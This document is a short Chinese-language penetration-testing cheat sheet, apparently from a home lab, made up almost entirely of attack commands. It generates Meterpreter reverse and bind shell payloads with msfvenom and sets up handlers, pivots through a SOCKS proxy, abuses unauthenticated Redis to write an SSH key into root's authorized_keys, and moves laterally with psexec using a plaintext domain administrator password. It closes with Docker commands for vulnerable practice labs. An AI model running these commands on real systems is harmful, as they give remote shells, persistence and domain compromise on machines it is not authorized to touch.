### msf反向连接

```cmd
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.111.25 LPORT=4444 -f elf -o ./shell.elf
```

### msf本地监听

```cmd
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.111.25
set LPORT 4444
run
```

```cmd
route add 192.168.52.0 255.255.255.0 1

use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0
set SRVPORT 10800
set VERSION 5
run -j
```

### redis写公钥

```cmd
type key.txt | redis-cli -h 192.168.111.20 -x set xxx
```

```cmd
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABxxxxxxxxxxxxxxxxxx97r97OEkWm+toMRW6rgXm0qXdKuC+w/OsC4B
```

```cmd
type key.txt | redis-cli -h 192.168.111.20 -x set xxx
redis-cli -h 192.168.111.20
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
save
```

### 正向连接上线msf

```cmd
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=10086 -f exe -o bind.exe

setg Proxies socks5:127.0.0.1:10800
setg ReverseAllowProxy true  
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 192.168.52.30
set LPORT 10086
run
```

### 监听正向连接

```cmd
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RHOSTS 192.168.93.40
set RPORT 10900         
set LPORT 10890          
set LHOST 127.0.0.1     
exploit
```

### 用域管账户登录

```cmd
use exploit/windows/smb/psexec
set RHOSTS 192.168.93.40
set SMBUser Administrator
set SMBPass Whoami2021
set SMBDomain WHOAMIANONY
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RPORT 445
set LPORT 49668           
set Proxies socks5:127.0.0.1:10801   
exploit
```

```cmd
use exploit/windows/smb/psexec
set RHOSTS 192.168.93.30
set SMBUser Administrator
set SMBPass Whoami2021
set SMBDomain WHOAMIANONY
set PAYLOAD windows/x64/meterpreter/bind_tcp
set RPORT 445
set LPORT 49669           
set Proxies socks5:127.0.0.1:10801   
exploit
```

```
docker run -d -p 8001:80 --name sqli-labs acgpiano/sqli-labs
docker run -d -p 8002:80 --name upload-labs c0ny1/upload-labs
docker run -d -p 8003:80 --name xss-labs vulfocus/xss-labs
docker run -d -p 8004:80 8023/pikachu-expect:latest
```

